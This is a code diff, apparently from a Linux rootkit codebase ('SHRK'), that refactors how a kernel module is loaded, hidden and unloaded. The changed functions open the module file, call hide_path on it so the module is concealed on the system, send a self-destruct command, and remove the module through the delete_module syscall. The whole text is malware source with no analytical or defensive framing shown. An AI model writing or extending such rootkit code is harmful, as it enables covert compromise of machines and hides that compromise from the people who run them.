@@ -22,7 +22,7 @@ bool kernel_load() {
   int64_t err         = 0;
   int     fd          = 0;
 
-  if ((fd = open(SHRK_MODULE, O_RDONLY)) < 0) {
+  if ((fd = open(SHRK_MODULE_PATH, O_RDONLY)) < 0) {
     debug_err("failed to open the kernel module");
     return false;
   }
@@ -58,7 +58,7 @@ bool kernel_load() {
       goto end;
     }
 
-    if (!hide_path(SHRK_MODULE)) {
+    if (!hide_path(SHRK_MODULE_PATH)) {
       debug("failed to hide the module");
       goto end;
     }
@@ -88,32 +88,15 @@ end:
 }
 
 bool kernel_unload() {
-  char *module_name = NULL, *module_path = strdup(SHRK_MODULE), *c = 0;
-  bool ret = false;
-
   if (!kernel_send(KERNEL_CMD_DESTRUCT, "\x00", 1))
-    goto end;
+    return false;
 
-  // get the module name
-  if((module_name = basename(module_path)) == NULL){
-    debug_err("failed to obtain the kernel module name");
-    goto end;
-  }
-
-  // remove the extension
-  for(c = module_name; *c != 0; c++)
-    if(*c == '.')
-      *c = 0;
-
-  if (syscall(SYS_delete_module, module_name, O_NONBLOCK) != 0) {
+  if (syscall(SYS_delete_module, SHRK_MODULE_NAME, O_NONBLOCK) != 0) {
     debug_err("failed to unload the kernel module");
-    goto end;
+    return false;
   }
 
-  ret = true;
-end:
-  free(module_path);
-  return ret;
+  return true;
 }
 
 bool kernel_send(kernel_cmd_t cmd, void *arg, uint64_t len) {
